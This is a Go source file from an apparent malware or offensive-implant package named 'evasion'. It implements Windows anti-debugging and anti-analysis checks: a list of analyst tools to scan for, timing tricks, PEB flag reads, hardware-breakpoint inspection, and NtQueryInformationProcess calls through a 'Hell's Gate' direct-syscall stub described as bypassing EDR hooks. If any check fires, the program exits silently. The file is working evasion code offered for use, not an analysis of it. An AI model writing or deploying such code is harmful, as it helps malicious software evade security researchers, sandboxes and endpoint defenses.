//go:build windows
// +build windows

package evasion

import (
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var debuggerProcesses = []string{
	"x64dbg.exe", "x32dbg.exe", "windbg.exe", "ollydbg.exe",
	"ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
	"processhacker.exe", "procmon.exe", "procmon64.exe",
	"procexp.exe", "procexp64.exe",
	"wireshark.exe", "fiddler.exe", "dnspy.exe",
	"cheatengine.exe", "cheatengine-x86_64.exe",
	"scylla.exe", "scylla_x64.exe", "scylla_x86.exe",
	"pestudio.exe", "die.exe", "exeinfope.exe",
}

var (
	modKernel32Check              = windows.NewLazySystemDLL("kernel32.dll")
	procIsDebuggerPresent         = modKernel32Check.NewProc("IsDebuggerPresent")
	procCheckRemoteDebuggerPresent = modKernel32Check.NewProc("CheckRemoteDebuggerPresent")
	procGetCurrentProcess         = modKernel32Check.NewProc("GetCurrentProcess")
)

func isDebuggerPresentWin() bool {
	r, _, _ := procIsDebuggerPresent.Call()
	return r != 0
}

func isRemoteDebuggerPresent() bool {
	hProc, _, _ := procGetCurrentProcess.Call()
	if hProc == 0 {
		return false
	}
	var present int32
	procCheckRemoteDebuggerPresent.Call(hProc, uintptr(unsafe.Pointer(&present)))
	return present != 0
}

func isDebuggerProcessRunning() bool {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return false
	}

	for {
		name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
		for _, bad := range debuggerProcesses {
			if name == bad {
				return true
			}
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	return false
}

// timingCheck detects single-step debugging by measuring a tight sleep.
// Under a debugger the elapsed time is many times longer than the requested delay.
func timingCheck() bool {
	before := time.Now()
	time.Sleep(1 * time.Millisecond)
	elapsed := time.Since(before)
	return elapsed > 500*time.Millisecond
}

// ntQueryDebugPort checks ProcessDebugPort (class 7) via NtQueryInformationProcess
// using a Hell's Gate stub — bypasses any EDR hook on the Win32 API layer.
func ntQueryDebugPort() bool {
	proc := NewHGProc("NtQueryInformationProcess")
	if proc == nil {
		return false
	}
	hProc, _, _ := procGetCurrentProcess.Call()
	if hProc == 0 {
		return false
	}
	var debugPort uintptr
	const ProcessDebugPort = 7
	r1, _, _ := proc.Call(
		hProc,
		uintptr(ProcessDebugPort),
		uintptr(unsafe.Pointer(&debugPort)),
		unsafe.Sizeof(debugPort),
		0,
	)
	// NTSTATUS 0 = success; non-zero debugPort means debugger attached
	return r1 == 0 && debugPort != 0
}

// ntGlobalFlagCheck reads PEB.NtGlobalFlag — set to 0x70 by the Windows loader
// when the process was created under a debugger (via CREATE_PROCESS_DEBUG_EVENT).
// Bit mask 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK |
// FLG_HEAP_VALIDATE_PARAMETERS.
// PEB+0xBC is the NtGlobalFlag field on x64 Windows 10+.
func ntGlobalFlagCheck() bool {
	peb := getPEB()
	if peb == 0 {
		return false
	}
	ntGlobalFlag := *(*uint32)(unsafe.Pointer(peb + 0xBC))
	return (ntGlobalFlag & 0x70) == 0x70
}

// ntQueryNoDebugInherit checks ProcessDebugFlags (class 0x1F): returns 0 when
// the process was created with DEBUG_ONLY_THIS_PROCESS / inherits a debugger.
func ntQueryNoDebugInherit() bool {
	proc := NewHGProc("NtQueryInformationProcess")
	if proc == nil {
		return false
	}
	hProc, _, _ := procGetCurrentProcess.Call()
	if hProc == 0 {
		return false
	}
	var flags uint32 = 1 // assume no-inherit by default
	const ProcessDebugFlags = 0x1F
	r1, _, _ := proc.Call(
		hProc,
		uintptr(ProcessDebugFlags),
		uintptr(unsafe.Pointer(&flags)),
		unsafe.Sizeof(flags),
		0,
	)
	// flags == 0 means EPROCESS.NoDebugInherit is clear → debugger present
	return r1 == 0 && flags == 0
}

// ntQueryHWBP checks hardware breakpoint registers DR0–DR3 via
// NtGetContextThread. Any non-zero DR register means a debugger has set a
// hardware breakpoint — something sandboxes do to intercept API calls.
func ntQueryHWBP() bool {
	proc := NewHGProc("NtGetContextThread")
	if proc == nil {
		return false
	}

	// CONTEXT_DEBUG_REGISTERS = 0x00010010 (x64)
	const contextDebugRegisters = 0x00010010
	const contextSize = 0x4D0 // sizeof(CONTEXT) on x64

	// Allocate 16-byte-aligned CONTEXT on the heap to satisfy CONTEXT alignment
	// requirement (CONTEXT must be 16-byte-aligned on x64).
	raw := make([]byte, contextSize+16)
	offset := uintptr(unsafe.Pointer(&raw[0])) & 0xF
	if offset != 0 {
		offset = 16 - offset
	}
	ctx := uintptr(unsafe.Pointer(&raw[offset]))

	// Set ContextFlags before the call.
	*(*uint32)(unsafe.Pointer(ctx)) = contextDebugRegisters

	// NtGetContextThread(CurrentThread=-2, PCONTEXT)
	const ntCurrentThread = ^uintptr(1) // (HANDLE)-2
	r1, _, _ := proc.Call(ntCurrentThread, ctx)
	if r1 != 0 {
		return false
	}

	// DR0–DR3 are at CONTEXT offsets 0x50–0x68 on x64.
	dr0 := *(*uintptr)(unsafe.Pointer(ctx + 0x50))
	dr1 := *(*uintptr)(unsafe.Pointer(ctx + 0x58))
	dr2 := *(*uintptr)(unsafe.Pointer(ctx + 0x60))
	dr3 := *(*uintptr)(unsafe.Pointer(ctx + 0x68))
	return dr0|dr1|dr2|dr3 != 0
}

// evadeDebugger exits silently if a debugger is detected via any method.
func evadeDebugger() {
	if isDebuggerPresentWin() ||
		isRemoteDebuggerPresent() ||
		isDebuggerProcessRunning() ||
		timingCheck() ||
		rdtscTimingCheck() ||
		ntQueryDebugPort() ||
		ntQueryNoDebugInherit() ||
		ntGlobalFlagCheck() ||
		ntQueryHWBP() {
		os.Exit(0)
	}
}
